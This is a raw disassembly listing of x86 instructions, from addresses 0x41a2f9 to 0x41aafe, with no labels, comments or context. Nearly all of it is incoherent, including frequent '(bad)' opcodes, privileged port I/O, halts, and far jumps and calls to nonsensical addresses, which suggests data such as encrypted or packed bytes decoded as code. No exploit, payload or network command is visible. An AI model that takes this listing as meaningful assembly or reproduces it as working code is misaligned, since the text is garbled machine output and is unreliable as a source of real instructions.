  41a2f9:	(bad)  
  41a2fb:	out    0xd3,eax
  41a2fd:	repz mov cl,0xe0
  41a301:	leave  
  41a302:	hlt    
  41a303:	sti    
  41a304:	int    0xc6
  41a306:	out    0xef,al
  41a308:	rcr    edx,1
  41a30a:	icebp  
  41a30b:	cli    
  41a30c:	out    dx,eax
  41a30d:	sar    esp,1
  41a30f:	clc    
  41a310:	push   es
  41a311:	fsub   st,st(5)
  41a313:	(bad)  
  41a315:	lock fsubrp st(3),st
  41a318:	xlat   BYTE PTR ds:[ebx]
  41a319:	add    al,0xca
  41a31b:	in     eax,dx
  41a31c:	out    0x7,al
  41a31e:	retf   0xbdd1
  41a321:	mov    ebp,0xd5ccc2dc
  41a326:	mov    ecx,0xbdf7c6e9
  41a32b:	sar    BYTE PTR [edx-0x25024801],1
  41a331:	fdivrp st(2),st
  41a333:	int3   
  41a334:	mov    ecx,0xf9d4fc01
  41a339:	test   BYTE PTR [ebx],0xff
  41a33c:	add    al,BYTE PTR [ebx]
  41a33e:	fmulp  st(0),st
  41a340:	mov    bh,0xdd
  41a342:	into   
  41a343:	les    esi,FWORD PTR [eax-0x12c0f3a]
  41a349:	retf   
  41a34a:	hlt    
  41a34b:	out    dx,al
  41a34c:	xlat   BYTE PTR ds:[ebx]
  41a34d:	mov    ecx,0xc1fae3f6
  41a352:	add    edx,ebp
  41a354:	(bad)  
  41a355:	aam    0xc5
  41a357:	loop   0x41a321
  41a359:	(bad)  
  41a35a:	(bad)  
  41a35c:	add    al,0x13
  41a35e:	jmp    0xc20c7a4a
  41a363:	in     eax,0xe0
  41a365:	in     eax,0xd2
  41a367:	int3   
  41a368:	mov    eax,0xb9bccaf3
  41a36d:	aad    0xb9
  41a36f:	shl    dh,1
  41a371:	loopne 0x41a353
  41a373:	pop    es
  41a374:	shl    cl,0xf7
  41a377:	in     eax,0xe5
  41a379:	or     ebp,ecx
  41a37b:	in     al,0xd3
  41a37d:	or     DWORD PTR [edi-0x3a392c13],ebp
  41a383:	loop   0x41a37a
  41a385:	cli    
  41a386:	jmp    0xf6bc:0xbfc5c4f4
  41a38d:	aam    0xda
  41a38f:	shl    esi,1
  41a391:	(bad)  
  41a392:	icebp  
  41a393:	inc    DWORD PTR [ebx]
  41a395:	not    ecx
  41a397:	fdivr  st(4),st
  41a399:	retf   0xecf8
  41a39c:	fucom  st(3)
  41a39e:	scas   al,BYTE PTR es:[edi]
  41a39f:	call   0xdc2f7370
  41a3a4:	aam    0xcd
  41a3a6:	retf   0xd8f1
  41a3a9:	(bad)  
  41a3aa:	leave  
  41a3ab:	(bad)  
  41a3ad:	add    ecx,esp
  41a3af:	ret    
  41a3b0:	rol    BYTE PTR [esi],0xf6
  41a3b3:	fadd   st(1),st
  41a3b5:	out    0xd5,eax
  41a3b7:	fsubrp st(6),st
  41a3b9:	or     ah,dh
  41a3bb:	or     edx,ebx
  41a3bd:	adc    ch,cl
  41a3bf:	stos   BYTE PTR es:[edi],al
  41a3c0:	call   0xd130579a
  41a3c5:	cli    
  41a3c6:	int    0xd1
  41a3c8:	hlt    
  41a3c9:	mov    edi,0xdabdc8ec
  41a3ce:	fiadd  WORD PTR [eax]
  41a3d0:	cmc    
  41a3d1:	icebp  
  41a3d2:	stc    
  41a3d3:	std    
  41a3d4:	test   DWORD PTR [ecx],0xebd5dff5
  41a3da:	leave  
  41a3db:	fld    QWORD PTR [edi]
  41a3dd:	int3   
  41a3de:	scas   eax,DWORD PTR es:[edi]
  41a3df:	test   al,0xe3
  41a3e1:	test   dl,0xea
  41a3e4:	repz iret 
  41a3e6:	mov    ah,0xf4
  41a3e8:	repnz mov dh,0xfa
  41a3eb:	icebp  
  41a3ec:	sti    
  41a3ed:	fcmovbe st,st(4)
  41a3ef:	in     eax,dx
  41a3f0:	out    dx,eax
  41a3f1:	cmc    
  41a3f2:	fdivp  st(7),st
  41a3f4:	out    0x4,eax
  41a3f6:	add    esp,esp
  41a3f8:	jmp    0xdfce:0xfe3e1d4
  41a3ff:	shl    BYTE PTR [ebx-0x560c0a53],1
  41a405:	cli    
  41a406:	cmc    
  41a407:	(bad)
  41a40a:	fucomp st(7)
  41a40c:	repnz repz (bad) 
  41a410:	fdivrp st(2),st
  41a412:	ret    
  41a413:	std    
  41a414:	shl    ebp,cl
  41a416:	loope  0x41a3f9
  41a418:	add    BYTE PTR [eax],cl
  41a41a:	into   
  41a41b:	fmulp  st(1),st
  41a41d:	loopne 0x41a3ca
  41a41f:	shl    cl,1
  41a421:	leave  
  41a422:	xlat   BYTE PTR ds:[ebx]
  41a423:	in     al,0xcc
  41a425:	mov    edx,0xf6cdeeb5
  41a42a:	jmp    0xf2fb:0xefcacdbe
  41a431:	pop    es
  41a432:	mov    esp,0xe5e7c2fa
  41a437:	loop   0x41a402
  41a439:	in     al,0xcf
  41a43b:	loop   0x41a41c
  41a43d:	icebp  
  41a43e:	leave  
  41a43f:	mov    ebp,0xe8d4a8dc
  41a444:	jmp    0xf1315a12
  41a449:	mov    edx,0xd3d6b4fb
  41a44e:	add    edi,esp
  41a450:	push   es
  41a451:	fild   WORD PTR [ebx]
  41a453:	fmul   DWORD PTR [ebx]
  41a455:	add    eax,edi
  41a457:	enter  0xdee,0xd8
  41a45b:	enter  0x1d3,0xec
  41a45f:	iret   
  41a460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a461:	mov    al,0xc6
  41a463:	shl    bl,cl
  41a465:	mov    ebx,0xbbb6efc6
  41a46a:	mov    ah,0xb4
  41a46c:	fmulp  st(7),st
  41a46e:	mov    ecx,0xd6c2f0d2
  41a473:	sar    ah,0x1
  41a476:	ret    
  41a477:	(bad)
  41a47a:	out    0xdb,al
  41a47c:	add    ah,dh
  41a47e:	ffreep st(6)
  41a480:	lods   eax,DWORD PTR ds:[esi]
  41a481:	mov    al,0xbd
  41a483:	ror    bh,cl
  41a485:	fcmove st,st(4)
  41a487:	mov    cl,0xd3
  41a489:	fidivr WORD PTR [esi-0x2f2c160e]
  41a48f:	(bad)  
  41a491:	ret    0xd7de
  41a494:	add    eax,0xf9ddcad7
  41a499:	out    dx,al
  41a49a:	out    0xef,al
  41a49c:	stc    
  41a49d:	or     ebp,DWORD PTR [esi-0x112d3e48]
  41a4a3:	icebp  
  41a4a4:	mov    ch,0xfb
  41a4a6:	iret   
  41a4a7:	mov    ecx,0xfdf9d9b6
  41a4ac:	mov    ch,0xf8
  41a4ae:	out    dx,al
  41a4af:	mov    esp,0xccbde1bc
  41a4b4:	lds    eax,FWORD PTR ds:0xe10bd404
  41a4ba:	enter  0xc5cb,0xcd
  41a4be:	iret   
  41a4bf:	out    dx,eax
  41a4c0:	repnz div esp
  41a4c3:	stos   BYTE PTR es:[edi],al
  41a4c4:	loop   0x41a48b
  41a4c6:	lock aam 0xda
  41a4c9:	idiv   dl
  41a4cb:	enter  0xecd0,0xce
  41a4cf:	sar    edi,0xc7
  41a4d2:	(bad)  
  41a4d3:	repnz (bad) 
  41a4d6:	retf   
  41a4d7:	jmp    0xd0c:0xe5fbf5f9
  41a4de:	ret    0xcae7
  41a4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e2:	repnz rol dl,1
  41a4e5:	retf   0xe8e9
  41a4e8:	aam    0xf3
  41a4ea:	call   0xba3699cd
  41a4ef:	(bad)  
  41a4f1:	in     eax,0xc6
  41a4f3:	(bad)  
  41a4f4:	std    
  41a4f5:	cmc    
  41a4f6:	ror    DWORD PTR [edi],1
  41a4f8:	or     edi,eax
  41a4fa:	jmp    0xccf0:0xc2d20501
  41a501:	lods   al,BYTE PTR ds:[esi]
  41a502:	fdiv   QWORD PTR [esi+ebp*8-0x32252730]
  41a509:	(bad)  
  41a50b:	mov    edi,0xdde9bfdb
  41a510:	in     eax,dx
  41a511:	mov    DWORD PTR [ecx],0xe1fce0c1
  41a517:	clc    
  41a518:	loop   0x41a525
  41a51a:	(bad)  
  41a51b:	(bad)  
  41a51c:	repnz or al,0xb1
  41a51f:	rcl    cl,1
  41a521:	in     al,dx
  41a522:	out    dx,eax
  41a523:	mov    bh,0xdb
  41a525:	(bad)  
  41a526:	retf   
  41a527:	stc    
  41a528:	mov    dh,0xb5
  41a52a:	rcr    dl,1
  41a52c:	mov    eax,0xfed6efd7
  41a531:	mov    ebp,0xfbe702f1
  41a536:	(bad)  
  41a537:	out    0xf7,al
  41a539:	add    dl,ch
  41a53b:	out    0xdd,eax
  41a53d:	fnsave [ecx-0xc521922]
  41a543:	ret    
  41a544:	lock call 0xd9f669ff
  41a54a:	mov    dh,0xba
  41a54c:	fxch   st(7)
  41a54e:	cli    
  41a54f:	xlat   BYTE PTR ds:[ebx]
  41a550:	push   es
  41a551:	shl    dh,cl
  41a553:	mov    esi,0xd9e6dcd6
  41a558:	fcmovne st,st(3)
  41a55a:	(bad)  
  41a55b:	jmp    0x41a53f
  41a55d:	retf   
  41a55e:	leave  
  41a55f:	rol    edx,0xad
  41a562:	mov    bl,0xe9
  41a564:	in     al,dx
  41a565:	out    dx,al
  41a566:	mov    al,0xb7
  41a568:	(bad)
  41a56b:	sar    BYTE PTR [edx-0x11200e32],1
  41a571:	add    eax,0xf2c2e2d4
  41a576:	rol    DWORD PTR [esi],0xea
  41a579:	push   cs
  41a57a:	in     eax,0xea
  41a57c:	or     edi,ebx
  41a57e:	in     al,0xdc
  41a580:	jecxz  0x41a56f
  41a582:	jmp    0x41a546
  41a584:	cmc    
  41a585:	in     eax,dx
  41a586:	out    0xcc,eax
  41a588:	(bad)  
  41a589:	std    
  41a58a:	into   
  41a58b:	in     eax,dx
  41a58c:	mov    ecx,0xfeeed8d7
  41a591:	fucomp st(5)
  41a593:	shl    ch,0xe9
  41a596:	fnsetpm(287 only) 
  41a598:	(bad)  
  41a59a:	stc    
  41a59b:	in     eax,0xff
  41a59d:	repz retf 0xc4e1
  41a5a1:	jmp    0x41a598
  41a5a3:	hlt    
  41a5a4:	mov    dh,0xc9
  41a5a6:	(bad)  
  41a5a7:	cmc    
  41a5a8:	lods   eax,DWORD PTR ds:[esi]
  41a5a9:	sti    
  41a5aa:	mov    eax,0xffccbcb5
  41a5af:	call   0xe7427c74
  41a5b4:	add    bh,bl
  41a5b6:	add    al,0xc5
  41a5b8:	fmul   QWORD PTR [eax]
  41a5ba:	cmc    
  41a5bb:	aam    0xde
  41a5bd:	add    eax,0xe5e4caeb
  41a5c2:	scas   al,BYTE PTR es:[edi]
  41a5c3:	lock loope 0x41a598
  41a5c6:	jmp    0xd8ca:0xdafedff3
  41a5cd:	mov    ecx,0x500e8f1
  41a5d2:	fld    QWORD PTR [edx]
  41a5d4:	repz fild DWORD PTR [edx]
  41a5d7:	xlat   BYTE PTR ds:[ebx]
  41a5d8:	jmp    edi
  41a5da:	loopne 0x41a5db
  41a5dc:	or     cl,bh
  41a5de:	jmp    0x41a586
  41a5e0:	shr    bl,cl
  41a5e2:	scas   al,BYTE PTR es:[edi]
  41a5e3:	iret   
  41a5e4:	aam    0xd0
  41a5e6:	(bad)  
  41a5e8:	out    0xf2,al
  41a5ea:	cmc    
  41a5eb:	repnz std 
  41a5ed:	icebp  
  41a5ee:	call   0xd41e7ff1
  41a5f3:	fmul   st(3),st
  41a5f5:	xlat   BYTE PTR ds:[ebx]
  41a5f6:	cld    
  41a5f7:	retf   0xe60a
  41a5fa:	out    0x6,al
  41a5fc:	loope  0x41a5e3
  41a5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ff:	repnz in al,dx
  41a601:	jmp    0xbbcd:0xf1e6adcc
  41a608:	rcr    ebx,cl
  41a60a:	(bad)  
  41a60b:	iret   
  41a60c:	jmp    0x41a5d6
  41a60e:	cld    
  41a60f:	lock idiv ah
  41a612:	fadd   DWORD PTR [edi]
  41a614:	shl    esi,0xf1
  41a617:	(bad)  
  41a618:	enter  0xe5fe,0x13
  41a61c:	(bad)  
  41a61e:	retf   0xebcf
  41a621:	jecxz  0x41a616
  41a623:	(bad)  
  41a624:	mov    dl,0xb3
  41a626:	in     al,dx
  41a627:	mov    dh,0xe8
  41a629:	mov    ebx,0xf9f1eaec
  41a62e:	std    
  41a62f:	sar    eax,cl
  41a631:	rol    DWORD PTR [ebx],0xd6
  41a634:	(bad)  
  41a635:	(bad)  
  41a636:	icebp  
  41a637:	add    eax,ecx
  41a639:	in     eax,dx
  41a63a:	or     esp,esi
  41a63c:	repnz add esi,esp
  41a63f:	loopne 0x41a611
  41a641:	mov    dl,0xb5
  41a643:	loope  0x41a600
  41a645:	fcmovnb st,st(4)
  41a647:	jmp    0xb4e8:0xecf8f9c5
  41a64e:	(bad)  
  41a64f:	mov    esi,0xc1e6e5f1
  41a654:	clc    
  41a655:	add    al,0xd7
  41a657:	cli    
  41a658:	add    eax,0xcadaf4db
  41a65d:	out    0xae,al
  41a65f:	lock test eax,0xc7b4e4c8
  41a665:	enter  0xedd5,0xf3
  41a669:	hlt    
  41a66a:	mov    edi,0xd5b0d303
  41a66f:	ror    esp,cl
  41a671:	loope  0x41a66d
  41a673:	(bad)  
  41a674:	or     edx,edi
  41a676:	inc    DWORD PTR ds:0xae9e8fa
  41a67c:	int    0x8
  41a67e:	repnz fdiv DWORD PTR [edx-0x482c1353]
  41a685:	mov    al,0xe0
  41a687:	enter  0xd3f3,0xcf
  41a68b:	sti    
  41a68c:	(bad)  
  41a68d:	stc    
  41a68e:	test   BYTE PTR [edx],0xfa
  41a691:	in     al,dx
  41a692:	(bad)  
  41a693:	aam    0xff
  41a695:	out    0xfa,al
  41a697:	retf   0xeb
  41a69a:	add    esp,eax
  41a69c:	add    DWORD PTR [edx],edx
  41a69e:	test   eax,0xd0c3b3c5
  41a6a3:	int    0xf7
  41a6a5:	not    dl
  41a6a7:	out    0xef,al
  41a6a9:	aam    0xeb
  41a6ab:	(bad)  
  41a6ad:	cld    
  41a6ae:	into   
  41a6af:	iret   
  41a6b0:	ffree  st(3)
  41a6b2:	stc    
  41a6b3:	mov    esp,0x6d7e5d2
  41a6b8:	cmc    
  41a6b9:	fiadd  DWORD PTR [ebx]
  41a6bb:	(bad)  
  41a6bc:	fldlg2 
  41a6be:	in     al,dx
  41a6bf:	les    esi,FWORD PTR [eax-0x4d3f1a42]
  41a6c5:	(bad)  
  41a6c6:	sar    DWORD PTR [ecx-0x8054019],1
  41a6cc:	mov    eax,0xfbf4eef7
  41a6d1:	ret    
  41a6d2:	mul    dh
  41a6d4:	fiadd  WORD PTR ds:0x8c104c9
  41a6da:	in     eax,dx
  41a6db:	vpsubb xmm0,xmm0,xmm1
  41a6df:	test   eax,0xadf0eac1
  41a6e4:	xlat   BYTE PTR ds:[ebx]
  41a6e5:	jmp    0x41a69b
  41a6e7:	int    0xe9
  41a6e9:	sar    BYTE PTR [esi-0x3d36060f],cl
  41a6ef:	sar    BYTE PTR [esi-0x53b190b],cl
  41a6f5:	(bad)  
  41a6f6:	out    0xf0,al
  41a6f8:	fcmovne st,st(0)
  41a6fa:	in     eax,0xcc
  41a6fc:	add    DWORD PTR ds:0xafdecbc6,ecx
  41a702:	(bad)
  41a705:	retf   0xb7f6
  41a708:	int3   
  41a709:	shr    bl,1
  41a70b:	jmp    0x41a6c7
  41a70d:	div    cl
  41a70f:	sar    DWORD PTR [ecx+0xd7e0fb],0x3
  41a716:	add    edx,eax
  41a718:	jecxz  0x41a719
  41a71a:	pmaxsw mm0,QWORD PTR [ecx]
  41a71d:	(bad)  
  41a71e:	in     al,dx
  41a71f:	ffreep st(6)
  41a721:	retf   0xd7f6
  41a724:	loop   0x41a707
  41a726:	into   
  41a727:	(bad)  
  41a728:	retf   
  41a729:	mov    bh,0xee
  41a72b:	jmp    0x41a703
  41a72d:	rol    dl,cl
  41a72f:	(bad)  
  41a730:	repz fld st(3)
  41a733:	out    0xdf,al
  41a735:	add    al,0xf7
  41a737:	stc    
  41a738:	stc    
  41a739:	cld    
  41a73a:	add    al,0xda
  41a73c:	loop   0x41a73d
  41a73e:	rol    ch,cl
  41a740:	scas   al,BYTE PTR es:[edi]
  41a741:	mov    bh,0xb1
  41a743:	lods   eax,DWORD PTR ds:[esi]
  41a744:	aam    0xfa
  41a746:	mov    ebx,0xbfe6edf7
  41a74b:	cli    
  41a74c:	cld    
  41a74d:	std    
  41a74e:	fmul   st(7),st
  41a750:	fcmovnb st,st(3)
  41a752:	lock mov esp,0xe3d6db
  41a758:	fimul  WORD PTR [ecx]
  41a75a:	loop   0x41a725
  41a75c:	repnz add al,0xe0
  41a75f:	repz jmp 0xee2c5e46
  41a765:	mov    al,0xfa
  41a767:	in     eax,0xce
  41a769:	in     eax,dx
  41a76a:	fxch   st(1)
  41a76c:	mov    eax,0xd7d3d8fd
  41a771:	add    eax,0xd80affdd
  41a776:	add    al,0xe8
  41a778:	jecxz  0x41a759
  41a77a:	fsubr  st(7),st
  41a77c:	into   
  41a77d:	push   cs
  41a77e:	stos   DWORD PTR es:[edi],eax
  41a77f:	lods   eax,DWORD PTR ds:[esi]
  41a780:	xlat   BYTE PTR ds:[ebx]
  41a781:	lods   eax,DWORD PTR ds:[esi]
  41a782:	rol    bl,cl
  41a784:	lock out dx,al
  41a786:	retf   0xebdb
  41a789:	fld    st(5)
  41a78b:	int3   
  41a78c:	jmp    0xbfdf:0xd9e8edde
  41a793:	rol    bh,cl
  41a795:	imul   dl
  41a797:	cmc    
  41a798:	push   cs
  41a799:	aam    0xde
  41a79b:	adc    edi,ebx
  41a79d:	adc    eax,ebp
  41a79f:	in     eax,dx
  41a7a0:	mov    bh,0xc9
  41a7a2:	in     eax,dx
  41a7a3:	rol    dl,1
  41a7a5:	mov    ah,0xfa
  41a7a7:	mov    cl,0xed
  41a7a9:	icebp  
  41a7aa:	fmul   st(6),st
  41a7ac:	hlt    
  41a7ad:	std    
  41a7ae:	add    edx,esi
  41a7b0:	cli    
  41a7b1:	add    ah,dl
  41a7b3:	test   ebx,0x1e2d4f5
  41a7b9:	add    DWORD PTR [edx],eax
  41a7bb:	iret   
  41a7bc:	(bad)
  41a7bf:	out    dx,al
  41a7c0:	iret   
  41a7c1:	iret   
  41a7c2:	mov    ebp,0xd3f0f2ca
  41a7c7:	idiv   DWORD PTR [edi-0x1720071b]
  41a7cd:	lock sti 
  41a7cf:	mov    edi,0x6e2d3f6
  41a7d4:	aad    0xa
  41a7d6:	leave  
  41a7d7:	fldl2t 
  41a7d9:	lds    ecx,FWORD PTR [eax]
  41a7db:	loop   0x41a7a6
  41a7dd:	retf   0xbead
  41a7e0:	out    0xcb,al
  41a7e2:	scas   al,BYTE PTR es:[edi]
  41a7e3:	mov    dl,0xc1
  41a7e5:	icebp  
  41a7e6:	repnz clc 
  41a7e8:	clc    
  41a7e9:	xlat   BYTE PTR ds:[ebx]
  41a7ea:	out    dx,eax
  41a7eb:	mov    edi,0xfaccd9d3
  41a7f0:	sar    bh,1
  41a7f2:	cli    
  41a7f3:	cmc    
  41a7f4:	ret    
  41a7f5:	div    esp
  41a7f7:	(bad)  
  41a7f8:	add    bh,ch
  41a7fa:	jmp    0xd2e6:0xb802eecd
  41a801:	into   
  41a802:	mov    ebp,0xc0c1e9e1
  41a807:	icebp  
  41a808:	fucomip st,st(5)
  41a80a:	jmp    0xd5d4:0xe2fcdffe
  41a811:	cli    
  41a812:	ffree  st(3)
  41a814:	fcomi  st,st(7)
  41a816:	stc    
  41a817:	retf   0x7fa
  41a81a:	out    0xec,al
  41a81c:	int    0xd9
  41a81e:	scas   al,BYTE PTR es:[edi]
  41a81f:	jmp    0x41a7e0
  41a821:	repnz scas al,BYTE PTR es:[edi]
  41a823:	lods   eax,DWORD PTR ds:[esi]
  41a824:	out    dx,al
  41a825:	sar    eax,1
  41a827:	int    0xad
  41a829:	call   0xd1117624
  41a82e:	sti    
  41a82f:	idiv   edi
  41a831:	rcl    ah,0xdb
  41a834:	add    cl,al
  41a836:	jecxz  0x41a82d
  41a838:	fucomi st,st(3)
  41a83a:	or     edi,esi
  41a83c:	(bad)
  41a83f:	test   eax,0xc8c8e7d6
  41a844:	mov    ah,0xd2
  41a846:	repnz repnz iret 
  41a849:	clc    
  41a84a:	iret   
  41a84b:	stc    
  41a84c:	(bad)  
  41a84d:	rcr    esi,cl
  41a84f:	cld    
  41a850:	sti    
  41a851:	add    eax,edi
  41a853:	fst    st(7)
  41a855:	fucomi st,st(2)
  41a857:	dec    BYTE PTR [edx]
  41a859:	hlt    
  41a85a:	in     eax,0xc5
  41a85c:	or     edi,esp
  41a85e:	lock scas al,BYTE PTR es:[edi]
  41a860:	(bad)  
  41a862:	ror    ch,0xea
  41a865:	lods   al,BYTE PTR ds:[esi]
  41a866:	mov    ecx,0xf1b6cfdb
  41a86b:	shr    al,1
  41a86d:	add    eax,edx
  41a86f:	enter  0xfad5,0xcd
  41a873:	push   edi
  41a875:	(bad)  
  41a876:	mov    edi,0xc5c8c9c5
  41a87b:	dec    DWORD PTR [edi]
  41a87d:	add    dh,al
  41a87f:	lock mov dl,0xbd
  41a882:	cmc    
  41a883:	mov    ch,0xe0
  41a885:	retf   
  41a886:	rcl    al,cl
  41a888:	in     al,0xe6
  41a88a:	into   
  41a88b:	fcomip st,st(3)
  41a88d:	loop   0x41a88c
  41a88f:	xlat   BYTE PTR ds:[ebx]
  41a890:	rol    BYTE PTR [edx],cl
  41a892:	vpsrld ymm0,ymm4,XMMWORD PTR [edx]
  41a896:	mov    edi,0xeb06bdf0
  41a89b:	(bad)
  41a89e:	mov    bl,0xe6
  41a8a0:	int    0xe7
  41a8a2:	shl    edx,1
  41a8a4:	mov    ch,0xd0
  41a8a6:	mov    edx,0xd9d0d2d3
  41a8ab:	repz mov ecx,0xe7c8e9e2
  41a8b1:	stc    
  41a8b2:	(bad)  
  41a8b3:	stc    
  41a8b4:	(bad)
  41a8b7:	test   al,0xe3
  41a8ba:	jmp    0xb224bac3
  41a8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c0:	into   
  41a8c1:	jmp    0x41a8b2
  41a8c3:	jmp    0xc5099099
  41a8c8:	out    dx,eax
  41a8c9:	fcomip st,st(1)
  41a8cb:	jmp    0x3d3:0xc2bdd4ec
  41a8d2:	stc    
  41a8d3:	out    0x5,al
  41a8d5:	shl    ah,0xf6
  41a8d8:	jmp    0xea50b7be
  41a8dd:	add    al,0xe6
  41a8df:	fdiv   DWORD PTR [edx-0x314e3e40]
  41a8e5:	mov    edx,0xe5f3e5b7
  41a8ea:	lock jmp 0x41a8d0
  41a8ed:	leave  
  41a8ee:	loop   0x41a8ca
  41a8f0:	sti    
  41a8f1:	fcmovbe st,st(7)
  41a8f3:	xlat   BYTE PTR ds:[ebx]
  41a8f4:	out    0xd9,eax
  41a8f6:	fld    QWORD PTR ds:0xfb020706
  41a8fc:	int3   
  41a8fd:	in     eax,dx
  41a8fe:	(bad)  
  41a8ff:	xlat   BYTE PTR ds:[ebx]
  41a900:	mov    esp,0xf3d6abc3
  41a905:	in     al,0xf7
  41a907:	jmp    0x41a8fa
  41a909:	jmp    0xdbc8:0xc8faf2c4
  41a910:	out    dx,al
  41a911:	pop    es
  41a912:	cli    
  41a913:	(bad)  
  41a915:	or     ah,dh
  41a917:	or     ah,bl
  41a919:	loope  0x41a928
  41a91b:	add    edi,ebp
  41a91d:	clc    
  41a91e:	jecxz  0x41a912
  41a920:	shl    edi,0xab
  41a923:	stos   BYTE PTR es:[edi],al
  41a924:	int    0xb3
  41a926:	mov    bh,0xd6
  41a928:	lods   eax,DWORD PTR ds:[esi]
  41a929:	(bad)
  41a92c:	loop   0x41a8f1
  41a92e:	aam    0xd3
  41a930:	cli    
  41a931:	aam    0x5
  41a933:	mov    ebp,0xb0ae0c0
  41a938:	add    al,0xd9
  41a93a:	add    edx,ebx
  41a93c:	in     al,0xcc
  41a93e:	retf   0xacad
  41a941:	retf   0xc4d5
  41a944:	mov    al,0xf1
  41a946:	mov    dh,0xed
  41a948:	mov    cl,0xfd
  41a94a:	sti    
  41a94b:	call   0xde437d20
  41a950:	fstp   st(5)
  41a952:	cli    
  41a953:	idiv   ch
  41a955:	hlt    
  41a956:	fadd   st,st(0)
  41a958:	jmp    0xddfa:0xebcce303
  41a95f:	ror    ebx,1
  41a961:	jecxz  0x41a94c
  41a963:	loop   0x41a930
  41a965:	rcr    al,0xf0
  41a968:	in     al,dx
  41a969:	out    0xf9,al
  41a96b:	retf   0xf6cc
  41a96e:	repnz fild DWORD PTR [ebx]
  41a971:	std    
  41a972:	repz loopne 0x41a94f
  41a975:	in     eax,0xfb
  41a977:	add    al,0xde
  41a979:	add    ecx,DWORD PTR [ecx]
  41a97b:	fcmovnu st,st(7)
  41a97d:	add    al,0xc9
  41a97f:	out    0xbd,eax
  41a981:	shl    ah,0xad
  41a984:	loopne 0x41a97b
  41a986:	mov    dh,0xf2
  41a988:	call   0xb4fc8180
  41a98d:	sar    edi,1
  41a98f:	rcr    al,cl
  41a991:	std    
  41a992:	(bad)  
  41a993:	jecxz  0x41a991
  41a995:	jmp    0xc0507290
  41a99a:	fcmovne st,st(1)
  41a99c:	add    eax,0xc8e2ab09
  41a9a1:	shl    DWORD PTR [ebp-0x34285256],0xba
  41a9a8:	hlt    
  41a9a9:	(bad)  
  41a9aa:	hlt    
  41a9ab:	stc    
  41a9ac:	int3   
  41a9ad:	mov    ebp,0xb807face
  41a9b2:	fdivr  QWORD PTR [esi-0x7faf627]
  41a9b8:	loopne 0x41a990
  41a9ba:	ret    
  41a9bb:	fstp   st(4)
  41a9bd:	or     ah,dh
  41a9bf:	jmp    0xb5f4:0xaae4eadc
  41a9c6:	iret   
  41a9c7:	repz mov edx,0xeffcc4ba
  41a9cd:	sar    ch,1
  41a9cf:	call   0xf9429ac2
  41a9d4:	add    eax,0xd4e4caea
  41a9d9:	leave  
  41a9da:	into   
  41a9db:	jmp    0xedbc:0xcdededdc
  41a9e2:	iret   
  41a9e3:	retf   
  41a9e4:	shr    DWORD PTR [eax-0x4952462e],cl
  41a9ea:	mov    dh,0xeb
  41a9ec:	rcl    bl,1
  41a9ee:	fnstenv [esi-0x1919fc44]
  41a9f4:	lock add eax,0xebfd0fe6
  41a9fa:	jmp    0xbe45b4c1
  41a9ff:	leave  
  41aa00:	jmp    0xeb2955c7
  41aa05:	(bad)  
  41aa06:	mov    ecx,0xdfb6adee
  41aa0b:	shl    bh,1
  41aa0d:	(bad)  
  41aa0e:	mov    esp,0x3e301da
  41aa13:	shl    ebx,1
  41aa15:	or     edx,esp
  41aa17:	cld    
  41aa18:	leave  
  41aa19:	add    DWORD PTR [edx+ecx*1],ecx
  41aa1c:	or     bh,bh
  41aa1e:	fucomip st,st(2)
  41aa20:	in     eax,0xc1
  41aa22:	shl    bl,cl
  41aa24:	mov    ah,0xef
  41aa26:	mov    dl,0xba
  41aa28:	iret   
  41aa29:	in     eax,0xb4
  41aa2b:	in     al,dx
  41aa2c:	hlt    
  41aa2d:	mov    eax,0xd0bcc0db
  41aa32:	mov    ebx,0xcaf4c3d5
  41aa37:	retf   
  41aa38:	fadd   st(4),st
  41aa3a:	stc    
  41aa3b:	(bad)  
  41aa3c:	leave  
  41aa3d:	add    bl,ch
  41aa3f:	loop   0x41aa0d
  41aa41:	retf   0xe7c8
  41aa44:	(bad)  
  41aa45:	(bad)  
  41aa46:	fcmovnb st,st(4)
  41aa48:	lock out 0xf2,al
  41aa4b:	rol    ebx,cl
  41aa4d:	in     eax,dx
  41aa4e:	mov    edx,0xf7c6decc
  41aa53:	hlt    
  41aa54:	loopne 0x41aa28
  41aa56:	add    dl,al
  41aa58:	out    dx,al
  41aa59:	hlt    
  41aa5a:	call   0xad44b46a
  41aa5f:	mov    esp,0xc5f7b6c3
  41aa64:	fcmovne st,st(2)
  41aa66:	rcr    eax,0xe5
  41aa69:	fcmovne st,st(6)
  41aa6b:	clc    
  41aa6c:	out    dx,eax
  41aa6d:	iret   
  41aa6e:	loope  0x41aa6e
  41aa70:	fucomip st,st(5)
  41aa72:	loopne 0x41aa73
  41aa74:	cld    
  41aa75:	mov    esp,0xffcfe3ea
  41aa7a:	cld    
  41aa7b:	jmp    0xf302887c
  41aa80:	jmp    0x41aa4e
  41aa82:	out    0xc3,eax
  41aa84:	into   
  41aa85:	sar    al,cl
  41aa87:	(bad)  
  41aa88:	int    0xb9
  41aa8a:	out    dx,al
  41aa8b:	mov    ah,0xff
  41aa8d:	(bad)  
  41aa8e:	cld    
  41aa8f:	mov    esp,0xfacd0507
  41aa94:	(bad)  
  41aa95:	add    ebp,esi
  41aa97:	mov    DWORD PTR ds:0xdff9e8c6,0xcbdcb8f8
  41aaa1:	shr    BYTE PTR [esi-0x49162d19],cl
  41aaa7:	vpsubsw xmm6,xmm2,XMMWORD PTR [ebp-0x1c231606]
  41aaaf:	sar    eax,1
  41aab1:	fidivr DWORD PTR [ebx+edi*8-0x19fe0740]
  41aab8:	or     esp,eax
  41aaba:	or     DWORD PTR ds:0xe5ded9eb,ecx
  41aac0:	mov    ebp,0xe4b4d1c7
  41aac5:	int3   
  41aac6:	test   esp,0xf0beb6b5
  41aacc:	mov    ebx,0xfdf2ecdb
  41aad1:	mov    eax,0xe607de05
  41aad6:	dec    ecx
  41aad8:	test   BYTE PTR [esi],0xc7
  41aadb:	jecxz  0x41aadc
  41aadd:	xcrypt-ecb 
  41aae0:	loop   0x41aad0
  41aae2:	cmc    
  41aae3:	mov    cl,0xb6
  41aae5:	retf   0xaeef
  41aae8:	mov    edi,0xdfdfb8d6
  41aaed:	fadd   st,st(1)
  41aaef:	fidivr WORD PTR [esi-0x2d3a251b]
  41aaf5:	in     al,0xdd
  41aaf7:	add    esi,edi
  41aaf9:	mov    esp,0xf0af4c7
  41aafe:	(bad)  
